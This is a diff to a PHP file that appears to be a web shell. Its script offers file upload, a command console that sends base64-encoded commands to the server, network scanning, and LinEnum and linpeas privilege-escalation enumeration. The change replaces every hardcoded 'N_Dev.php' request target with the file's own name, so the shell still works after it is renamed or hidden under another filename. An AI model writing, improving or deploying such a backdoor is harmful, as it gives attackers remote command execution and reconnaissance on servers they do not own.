@@ -1,5 +1,4 @@
 <?php
-
     function unhex($y)
     {
         // $n = '';
@@ -695,6 +694,7 @@
     </div>
 
     <script>
+		const currentScript = "<?= basename(__FILE__) ?>";
         function hideAllInterfaces() {
             document.getElementById('file-container').style.display = 'none';
             document.getElementById('uploadInterface').style.display = 'none';
@@ -760,7 +760,7 @@
             formData.append('op', 'upload');
             formData.append('filename', fileName);
 
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -781,7 +781,7 @@
 
         function showConsole() {
             hideAllInterfaces();
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -820,7 +820,7 @@
         function executeCommand() {
             const cmd = document.getElementById('cmdInput').value;
             const encodedCmd = btoa(unescape(encodeURIComponent(cmd)));
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -838,7 +838,7 @@
 
         function showNetworkScan() {
             hideAllInterfaces();
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -861,7 +861,7 @@
         }
 
         function executeNetworkScan() {
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -876,7 +876,7 @@
 
         function showLinEnum() {
             hideAllInterfaces();
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -899,7 +899,7 @@
         }
 
         function executeLinEnum() {
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -914,7 +914,7 @@
 
         function showLinpeas() {
             hideAllInterfaces();
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -937,7 +937,7 @@
         }
 
         function executeLinpeas() {
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -960,7 +960,7 @@
                 body += `&path=${encodeURIComponent(path)}`;
             }
 
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -998,7 +998,7 @@
                 body += `&path=${encodeURIComponent(path)}`;
             }
 
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -1023,7 +1023,7 @@
                 body += `&path=${encodeURIComponent(path)}`;
             }
 
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -1061,7 +1061,7 @@
                 body += `&path=${encodeURIComponent(path)}`;
             }
 
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -1086,7 +1086,7 @@
                 body += `&path=${encodeURIComponent(path)}`;
             }
 
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
@@ -1118,7 +1118,7 @@
                 body += `&path=${encodeURIComponent(path)}`;
             }
 
-            fetch('N_Dev.php', {
+            fetch(currentScript, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
